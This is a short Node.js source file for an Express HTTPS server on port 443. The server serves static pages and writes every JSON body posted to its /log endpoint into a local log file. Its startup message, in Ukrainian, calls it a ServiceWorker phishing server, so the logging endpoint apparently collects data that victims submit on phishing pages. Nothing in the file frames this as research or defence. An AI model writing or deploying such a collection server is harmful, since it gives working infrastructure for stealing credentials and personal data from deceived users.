const express = require('express');
const https = require('https');
const fs = require('fs');

const app = express();
app.use(express.static('public'));

app.post('/log', express.json(), (req, res) => {
    fs.appendFileSync('logs/requests.log', JSON.stringify(req.body) + "\n");
    res.sendStatus(200);
});

https.createServer({
    key: fs.readFileSync('./cert/key.pem'),
    cert: fs.readFileSync('./cert/cert.pem')
}, app).listen(443, () => {
    console.log('ServiceWorker фішинг на 443');
});
